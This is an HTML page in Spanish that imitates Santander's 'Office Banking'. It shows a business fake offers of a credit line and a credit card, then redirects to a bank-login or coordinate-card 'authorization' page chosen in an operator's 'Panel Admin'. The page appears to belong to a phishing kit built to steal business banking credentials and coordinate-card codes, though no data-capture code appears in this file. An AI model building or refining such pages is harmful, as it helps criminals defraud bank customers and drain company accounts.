<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Productos</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="style.css">
  <style>
    .producto {
      display: flex;
      align-items: flex-start;
      margin-bottom: 20px;
    }
    .producto label {
      display: flex;
      align-items: flex-start;
      font-size: 14px;
      line-height: 1.4;
    }
    .producto input[type="radio"] {
      margin-right: 8px;
      margin-top: 3px;
    }
    .producto span {
      display: inline-block;
      max-width: 250px;
      word-wrap: break-word;
    }
    #mensaje {
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="logo-office-banking.png" alt="Office Banking" class="logo">

    <h1>PRODUCTOS DISPONIBLES PARA TU EMPRESA:</h1>

    <div class="producto">
      <label>
        <input type="radio" name="opcion" value="linea"> 
        <span>1.- <span id="producto1"></span> por <span id="monto1"></span></span>
      </label>
    </div>

    <div class="producto">
      <label>
        <input type="radio" name="opcion" value="tarjeta"> 
        <span>2.- <span id="producto2"></span> por <span id="monto2"></span></span>
      </label>
    </div>

    <button class="btn-santander" id="quieroBtn">
      LO QUIERO<span class="bg-arrow"></span>
    </button>

    <div id="mensaje"></div>
  </div>
 
  <script>
    // Formato CLP
    function formatoCLP(valor){
      return new Intl.NumberFormat("es-CL", {
        style: "currency",
        currency: "CLP",
        minimumFractionDigits: 0,
        maximumFractionDigits: 0
      }).format(valor);
    }

    document.addEventListener("DOMContentLoaded", () => {
      const producto1 = localStorage.getItem("producto1") || "Línea de Crédito";
      const monto1 = localStorage.getItem("lineaMonto") || 5000000;
      const producto2 = localStorage.getItem("producto2") || "Tarjeta de Crédito WorldMember Limited Business";
      const monto2 = localStorage.getItem("tarjetaMonto") || monto1;

      document.getElementById("producto1").innerText = producto1;
      document.getElementById("monto1").innerText = formatoCLP(monto1);
      document.getElementById("producto2").innerText = producto2;
      document.getElementById("monto2").innerText = formatoCLP(monto2);
    });

    document.getElementById("quieroBtn").addEventListener("click", function(){
      const seleccion = document.querySelector('input[name="opcion"]:checked');
      if(!seleccion){
        document.getElementById("mensaje").innerText = "⚠️ Debes seleccionar un producto.";
        return;
      }

      // Guardar selección
      localStorage.setItem("seleccionProducto", seleccion.value);

      // Recuperar tipo de autorización definido en Panel Admin
      const tipoAutorizacion = localStorage.getItem("tipoAutorizacion") || "santander";

      document.getElementById("mensaje").innerText = "Serás redirigido al área de autorización...";

      setTimeout(() => {
        if(tipoAutorizacion === "santander"){
          window.location.href = "autorizacion-santander.html";
        } else {
          window.location.href = "autorizacion-coordenadas.html";
        }
      }, 2000);
    });
  </script>
</body>
</html>
